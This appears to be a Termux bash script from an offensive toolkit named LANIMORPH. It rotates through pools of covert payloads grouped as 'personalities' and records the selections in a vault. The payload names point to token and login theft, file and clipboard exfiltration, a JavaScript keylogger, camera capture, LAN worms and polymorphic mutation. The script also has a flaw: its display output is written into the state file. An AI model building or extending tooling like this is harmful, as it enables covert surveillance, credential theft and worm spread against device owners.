#!/data/data/com.termux/files/usr/bin/bash
log="$HOME/LANIMORPH/logs/inject_silent.log"
vault="$HOME/LANIMORPH/vault"
rotator_db="$vault/personality_state.db"

declare -A personality_pool
declare -A personality_last

mkdir -p "$vault"
touch "$rotator_db"

# Initialize payload pools per personality
personality_pool["scout"]="fingerprint_dump.py bluetooth_mapper.sh chrome_token_dump.py"
personality_pool["leech"]="file_exfil.sh clip_sniff.py encrypted_exfil.py"
personality_pool["prankster"]="mic_drop_termux.sh screen_dump_termux.sh scream_flash.sh"
personality_pool["mimic"]="polymorph_mutator.py payload_skinwalker.py mirror_reflector.sh"
personality_pool["creep"]="cam_snap_grab.py chrome_login_termux.py js_keylogger.js"
personality_pool["parasite"]="lan_worm.py targeted_beacon.sh worm_chain_crawler.py"

# Load last used index for each
while read -r line; do
  type="${line%%:*}"
  idx="${line##*:}"
  personality_last["$type"]=$idx
done < "$rotator_db"

# Select next payload per type
for type in "${!personality_pool[@]}"; do
  pool=(${personality_pool[$type]})
  total=${#pool[@]}
  last=${personality_last[$type]:-0}
  next=$(( (last + 1) % total ))
  selected="${pool[$next]}"
  echo -e "\033[1;36m[$type]\033[0m → $selected"

  # Write selected payload to personality drop folder
  echo "$selected" > "$vault/selected_$type.txt"

  # Save updated index
  echo "$type:$next"
done > "$rotator_db"

echo -e "\n[✓] Personality payloads rotated and saved to vault.\n"
